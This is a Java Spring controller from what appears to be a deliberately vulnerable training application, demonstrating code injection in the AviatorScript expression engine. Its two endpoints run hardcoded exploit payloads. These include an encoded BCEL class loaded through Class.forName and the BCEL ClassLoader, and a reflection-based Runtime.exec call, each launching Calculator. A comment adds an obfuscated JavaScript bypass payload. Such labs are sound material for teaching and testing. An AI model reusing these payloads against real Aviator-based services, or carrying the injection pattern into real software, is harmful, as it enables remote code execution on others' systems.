package com.best.hello.controller.RCE;

import com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing;
import io.swagger.annotations.ApiOperation;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.googlecode.aviator.AviatorEvaluator;
import com.googlecode.aviator.AviatorEvaluatorInstance;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;


@RestController
@RequestMapping("/RCE/Aviator")
public class AviatorVul {

    /**
     * @poc http://127.0.0.1:8888/RCE/Aviator/vul?
     * JS Payload绕过：var a = mainOutput(); function mainOutput() { var x=java.lang.\/****\/Runtime.getRuntime().exec("open -a Calculator");}
     * <p>
     * 在Java 8之后ScriptEngineManager的eval函数就没有了
     */
    @ApiOperation(value = "vul：代码注入 - 表达式引擎", notes = "AviatorScript组件表达式注入漏洞")
    @GetMapping("/vul")
    public String aviator() {
        try {

            AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
            evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open /System/Applications/Calculator.app\") );");


            return "漏洞执行成功";
        } catch (Exception e) {
            return "加载远程脚本: ";
        }
    }

    @ApiOperation(value = "vul：代码注入 - 表达式引擎", notes = "AviatorScript组件表达式注入漏洞")
    @GetMapping("/sink")
    public String aviatorSink() {
        try {
            ScriptEngineManager m = new ScriptEngineManager();
            ScriptEngine engine = m.getEngineByName("aviator");
            engine.eval("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open /System/Applications/Calculator.app\") );");

            AviatorEvaluatorInstance evaluator0 = AviatorEvaluator.newInstance();
            evaluator0.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());
            evaluator0.execute("exec(Runtime.getRuntime(), 'open /System/Applications/Calculator.app')");

            AviatorEvaluatorInstance evaluator1 = AviatorEvaluator.newInstance();
//        evaluator1.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open /System/Applications/Calculator.app\") );");
//        evaluator1.compile("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open /System/Applications/Calculator.app\") );");
            return "漏洞执行成功";
        } catch (Exception e) {
            return "加载远程脚本: ";
        }
    }

}